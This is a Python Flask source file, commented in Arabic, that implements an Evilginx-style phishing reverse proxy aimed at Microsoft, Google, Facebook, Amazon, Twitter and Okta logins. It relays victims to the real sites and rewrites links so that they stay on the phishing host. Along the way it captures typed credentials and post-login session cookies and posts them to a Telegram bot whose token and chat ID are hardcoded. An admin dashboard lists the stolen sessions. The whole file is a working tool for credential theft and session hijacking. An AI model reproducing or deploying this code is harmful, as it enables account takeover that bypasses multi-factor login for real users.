from flask import Flask, request, render_template, make_response, redirect, url_for
import requests
import logging
from urllib.parse import urlparse, urljoin, quote
import json
from datetime import datetime
import os
import urllib3

# تعطيل تحذيرات SSL غير الآمنة لضمان العمل بسلاسة خلف البروكسي
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ======================== الإعدادات الخاصة بك ========================
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '1367401179')
# ====================================================================

# تحديد مجلد القوالب لـ Flask لضمان عمل لوحة التحكم
app = Flask(__name__, template_folder='templates')
app.secret_key = os.urandom(24).hex()

# إعداد التسجيل (Logging)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# قاموس لتخزين الجلسات المسروقة مؤقتاً
captured_sessions = {}

class PhishletHandler:
    """معالج القوالب - يشبه تماماً Phishlets في Evilginx الأصلية"""
    
    def __init__(self, name, target_domain, proxy_hosts, auth_tokens, creds_fields, auth_urls):
        self.name = name
        self.target_domain = target_domain
        self.proxy_hosts = proxy_hosts
        self.auth_tokens = auth_tokens
        self.creds_fields = creds_fields
        self.auth_urls = auth_urls
        
    def capture_credentials(self, form_data):
        """تسجيل بيانات الدخول وإرسالها إلى تيليجرام"""
        creds = {}
        for field in self.creds_fields:
            if field in form_data:
                creds[field] = form_data[field]
        
        if creds:
            message = f"🔐 **New Credentials Captured**\n"
            message += f"🎯 **Target:** {self.name}\n"
            message += f"🕒 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            message += f"📋 **Data:**\n```json\n{json.dumps(creds, indent=2)}\n```"
            self.send_to_telegram(message)
            logging.info(f"Credentials captured: {creds}")
        return creds
    
    def capture_session_cookies(self, response_cookies):
        """التقاط كوكيز الجلسة بعد تسجيل الدخول (Session Hijacking)"""
        captured = {}
        cookies_dict = {}
        
        if hasattr(response_cookies, 'get_dict'):
            cookies_dict = response_cookies.get_dict()
        elif isinstance(response_cookies, dict):
            cookies_dict = response_cookies
        else:
            for cookie in response_cookies:
                cookies_dict[cookie.name] = cookie.value
            
        for cookie_name in self.auth_tokens:
            if cookie_name in cookies_dict:
                captured[cookie_name] = cookies_dict[cookie_name]
        
        if captured:
            session_id = datetime.now().strftime("%Y%m%d_%H%%S")
            session_data = {
                'site': self.name,
                'cookies': captured,
                'timestamp': str(datetime.now())
            }
            captured_sessions[session_id] = session_data
            
            message = f"🎫 **New Session Token Captured!**\n"
            message += f"🎯 **Target:** {self.name}\n"
            message += f"🆔 **Session ID:** `{session_id}`\n"
            message += f"🕒 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            cookie_msg = "\n".join([f"  • `{k}`: `{v[:50]}...`" for k, v in captured.items()])
            message += f"🍪 **Cookies:**\n{cookie_msg}\n"
            # تم تعديل هذا السطر: لا نستخدم request هنا
            message += f"🔗 **View Full:** /admin/session/{session_id}"
            self.send_to_telegram(message)
            
            logging.info(f"Session captured: {session_id}")
            return session_id
        return None
    
    def send_to_telegram(self, message):
        """إرسال رسالة إلى تيليجرام"""
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
            requests.post(url, json=payload, timeout=5)
        except Exception as e:
            logging.error(f"Telegram error: {e}")
    
    def rewrite_content(self, content, content_type, current_host):
        """تعديل الروابط في الصفحات (Content Rewriting)"""
        if 'text/html' in content_type or 'application/javascript' in content_type:
            try:
                if isinstance(content, bytes):
                    content = content.decode('utf-8', errors='ignore')
                
                for proxy in self.proxy_hosts:
                    orig_domain = f"{proxy['orig_sub']}.{self.target_domain}" if proxy['orig_sub'] else self.target_domain
                    phish_domain = current_host
                    
                    content = content.replace(orig_domain, phish_domain)
                    content = content.replace(f"https://{orig_domain}", f"https://{phish_domain}")
                    content = content.replace(f"http://{orig_domain}", f"https://{phish_domain}")
                
                return content.encode('utf-8')
            except:
                return content
        return content

# ======================== تعريف جميع الخدمات (Phishlets) ========================
phishlets = {
    'microsoft': PhishletHandler(
        name='Microsoft', target_domain='login.live.com',
        proxy_hosts=[{'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'login.live.com'}],
        auth_tokens=['ESTSAUTH', 'MSFPC', 'MSPRequ'],
        creds_fields=['login', 'passwd', 'loginfmt', 'Password'],
        auth_urls=['https://account.live.com', 'https://account.microsoft.com']
    ),
    'google': PhishletHandler(
        name='Google', target_domain='accounts.google.com',
        proxy_hosts=[{'phish_sub': 'accounts', 'orig_sub': 'accounts', 'domain': 'google.com'}],
        auth_tokens=['SAPISID', 'APISID', 'SSID', 'SID', 'LSID'],
        creds_fields=['email', 'password', 'identifier', 'credentials.passwd'],
        auth_urls=['https://myaccount.google.com', 'https://mail.google.com']
    ),
    'facebook': PhishletHandler(
        name='Facebook', target_domain='www.facebook.com',
        proxy_hosts=[{'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'facebook.com'}],
        auth_tokens=['c_user', 'xs', 'fr', 'sb'],
        creds_fields=['email', 'pass'],
        auth_urls=['https://www.facebook.com/?sk=welcome']
    ),
    'amazon': PhishletHandler(
        name='Amazon', target_domain='www.amazon.com',
        proxy_hosts=[{'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'amazon.com'}],
        auth_tokens=['session-id', 'session-token', 'ubid-main', 'x-main'],
        creds_fields=['email', 'password'],
        auth_urls=['https://www.amazon.com/?ref_=nav_signin']
    ),
    'twitter': PhishletHandler(
        name='Twitter', target_domain='twitter.com',
        proxy_hosts=[{'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'twitter.com'}],
        auth_tokens=['auth_token', 'ct0', 'twid'],
        creds_fields=['session[username_or_email]', 'session[password]'],
        auth_urls=['https://twitter.com/home']
    ),
    'okta': PhishletHandler(
        name='Okta', target_domain='login.okta.com',
        proxy_hosts=[{'phish_sub': 'login', 'orig_sub': 'login', 'domain': 'okta.com'}],
        auth_tokens=['sid', 'DT', 'oktaStateToken'],
        creds_fields=['username', 'password'],
        auth_urls=['https://login.okta.com/app/UserHome']
    )
}

# المسارات الإدارية
@app.route('/admin/dashboard')
def admin_dashboard():
    try:
        return render_template('dashboard.html', sessions=captured_sessions, bot_username='Amrsavebot')
    except Exception as e:
        return f"Dashboard Error: {str(e)}", 500

@app.route('/admin/session/<session_id>')
def get_session(session_id):
    if session_id in captured_sessions:
        response = make_response(json.dumps(captured_sessions[session_id], indent=2))
        response.headers['Content-Type'] = 'application/json'
        return response
    return "Session not found", 404

@app.route('/admin/clear')
def clear_sessions():
    captured_sessions.clear()
    return redirect(url_for('admin_dashboard'))

# الوكيل العكسي (Reverse Proxy) - قلب Evilginx
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path):
    host = request.headers.get('Host', '').split(':')[0]
    
    # اختيار الخدمة بناءً على الرابط أو استخدام ميكروسوفت كافتراضي
    current_phishlet = phishlets['microsoft']
    for name, phishlet in phishlets.items():
        if name in host or phishlet.target_domain in host:
            current_phishlet = phishlet
            break
    
    target_domain = current_phishlet.target_domain
    target_sub = 'www'
    for proxy_config in current_phishlet.proxy_hosts:
        if proxy_config['phish_sub'] in host:
            target_sub = proxy_config['orig_sub']
            break
    
    target_url = f"https://{target_sub}.{target_domain}/{path}" if not path.startswith('http') else path
    
    try:
        # تصفية الترويسات لتجنب مشاكل البروكسي
        headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'content-length', 'accept-encoding']}
        headers['User-Agent'] = request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        
        if request.headers.get('Referer'):
            headers['Referer'] = request.headers['Referer'].replace(host, target_domain)
        
        data = request.get_data()
        if request.method == 'POST' and request.form:
            current_phishlet.capture_credentials(request.form.to_dict())

        # تنفيذ الطلب للموقع الأصلي
        resp = requests.request(
            method=request.method, url=target_url, headers=headers, 
            cookies=request.cookies, data=data, verify=False, 
            allow_redirects=False, timeout=30
        )
        
        # تصفية ترويسات الاستجابة
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 'strict-transport-security']
        response_headers = [(name, value) for name, value in resp.raw.headers.items() if name.lower() not in excluded_headers]
        
        # تعديل المحتوى (استبدال الروابط)
        content = current_phishlet.rewrite_content(resp.content, resp.headers.get('Content-Type', ''), host)
        response = make_response(content)
        response.status_code = resp.status_code
        
        for name, value in response_headers:
            response.headers[name] = value
        
        # نقل الكوكيز وسرقة الجلسة
        for cookie_name, cookie_value in resp.cookies.items():
            response.set_cookie(cookie_name, cookie_value, domain=host, secure=True, httponly=True, samesite='Lax')
        
        if resp.cookies:
            current_phishlet.capture_session_cookies(resp.cookies)
            
        # تعديل روابط التوجيه (Redirects) لتبقى في موقعنا
        if resp.status_code in [301, 302, 303]:
            location = resp.headers.get('Location', '')
            if target_domain in location:
                response.headers['Location'] = location.replace(target_domain, host)
            for auth_url in current_phishlet.auth_urls:
                if auth_url in location:
                    current_phishlet.capture_session_cookies(resp.cookies)
        
        return response
    except Exception as e:
        logging.error(f"Proxy error: {str(e)}")
        return f"Error: {str(e)}", 500

if __name__ == '__main__':
    # المنفذ الافتراضي لـ Render (يُقرأ من متغير البيئة PORT أو 10000)
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
